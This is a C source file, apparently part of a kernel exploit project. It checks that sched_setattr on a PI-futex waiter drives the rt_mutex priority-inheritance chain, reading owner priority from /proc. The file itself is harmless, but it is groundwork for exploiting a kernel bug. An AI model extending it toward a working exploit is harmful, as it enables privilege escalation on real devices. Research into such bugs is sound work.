/* Zero-risk validation of the trigger path the whole exploit depends on:
 *
 *   sched_setattr(waiter_tid, nice)  ->  __sched_setscheduler(pi=true)
 *                                    ->  rt_mutex_adjust_pi(waiter)
 *                                    ->  rt_mutex_adjust_prio_chain()
 *                                    ->  rt_mutex_setprio(owner, top_waiter)
 *
 * If the chain really runs, the *owner* of a PI futex inherits the waiter's
 * priority, which is visible from userspace as field 18 ("priority" =
 * p->prio - 100) of /proc/<tid>/stat. Nothing here writes to the kernel, so
 * a wrong assumption can never panic the device.
 *
 * Expected sequence with owner nice 19 (prio 139) and waiter nice N:
 *   waiter blocked, nice 0   -> owner priority 20  (boosted to 120)
 *   waiter nice 19           -> owner priority 39  (chain de-boosts)
 *   waiter nice 5            -> owner priority 25  (chain re-boosts)
 */
#include "common.h"

static uint32_t st_f_pi;
static atomic_int st_owner_ready;
static atomic_int st_owner_tid;
static atomic_int st_waiter_tid;
static atomic_int st_waiter_waiting;

static int proc_priority(int tid) {
  char path[64];
  char buf[1024];
  snprintf(path, sizeof(path), "/proc/%d/stat", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  /* comm may contain spaces/parens; fields are counted after the last ')' */
  char *p = strrchr(buf, ')');
  if (!p) {
    return -1;
  }
  p++;
  /* field 3 == state, so priority (18) is the 16th token after ')' */
  int field = 2;
  while (*p && field < 18) {
    if (*p == ' ') {
      field++;
      if (field == 18) {
        return atoi(p + 1);
      }
    }
    p++;
  }
  return -1;
}

static int proc_nice(int tid) {
  char path[64];
  char buf[512];
  snprintf(path, sizeof(path), "/proc/%d/stat", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *p = strrchr(buf, ')');
  if (!p) {
    return -1;
  }
  p++;
  int field = 2;
  while (*p && field < 19) {
    if (*p == ' ') {
      field++;
      if (field == 19) {
        return atoi(p + 1);
      }
    }
    p++;
  }
  return -1;
}

static void *st_owner(void *arg) {
  (void)arg;
  disable_rseq_for_thread();
  /* start low so any boost is visible */
  sched_setattr_tid((int)syscall(SYS_gettid), 19);
  atomic_store(&st_owner_tid, (int)syscall(SYS_gettid));
  long r = futex_op(&st_f_pi, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("schedtest owner: LOCK_PI ret=%ld errno=%d tid=%d nice=%d prio=%d\n",
          r, errno, atomic_load(&st_owner_tid),
          proc_nice(atomic_load(&st_owner_tid)),
          proc_priority(atomic_load(&st_owner_tid)));
  atomic_store(&st_owner_ready, 1);
  for (;;) {
    sleep(1);
  }
  return NULL;
}

static void *st_waiter(void *arg) {
  (void)arg;
  disable_rseq_for_thread();
  atomic_store(&st_waiter_tid, (int)syscall(SYS_gettid));
  while (!atomic_load(&st_owner_ready)) {
    usleep(1000);
  }
  /* FUTEX_LOCK_PI takes an ABSOLUTE CLOCK_REALTIME deadline (unlike
   * FUTEX_WAIT, which is relative CLOCK_MONOTONIC). Passing a monotonic
   * value makes it look like 1970 and returns ETIMEDOUT instantly. */
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_REALTIME, &timeout));
  timeout.tv_sec += 6;
  atomic_store(&st_waiter_waiting, 1);
  long r = futex_op(&st_f_pi, FUTEX_LOCK_PI, 0, &timeout, NULL, 0);
  pr_info("schedtest waiter: LOCK_PI ret=%ld errno=%d (expected -1/ETIMEDOUT)\n",
          r, errno);
  return NULL;
}

int run_sched_chain_test(void) {
  disable_rseq_for_thread();
  set_unbuffer();

  pthread_t owner;
  pthread_t waiter;
  SYSCHK(pthread_create(&owner, NULL, st_owner, NULL));
  SYSCHK(pthread_create(&waiter, NULL, st_waiter, NULL));
  while (!atomic_load(&st_owner_ready) || !atomic_load(&st_waiter_waiting)) {
    usleep(1000);
  }
  usleep(300000);  /* let the waiter actually block (and boost the owner) */

  int otid = atomic_load(&st_owner_tid);
  int wtid = atomic_load(&st_waiter_tid);
  pr_info("schedtest: owner tid=%d waiter tid=%d\n", otid, wtid);
  pr_info("schedtest baseline: owner nice=%d prio=%d (waiter nice 0 -> expect "
          "prio 20 if boost landed)\n", proc_nice(otid), proc_priority(otid));

  const int nices[] = {19, 5, 19, 0};
  for (size_t i = 0; i < sizeof(nices) / sizeof(nices[0]); i++) {
    errno = 0;
    long r = sched_setattr_tid(wtid, nices[i]);
    int rerrno = errno;
    usleep(120000);
    int op = proc_priority(otid);
    int wn = proc_nice(wtid);
    int wp = proc_priority(wtid);
    pr_info("schedtest: setattr(waiter,nice=%d) ret=%ld errno=%d -> waiter "
            "nice=%d prio=%d | owner prio=%d\n",
            nices[i], r, rerrno, wn, wp, op);
    /* owner prio should equal min(139, 120 + nice) = min(139, 120+nice) */
  }
  pr_success("schedtest done: owner prio must track the waiter's priority; "
             "if it stays 20 the PI chain never ran\n");
  return 0;
}
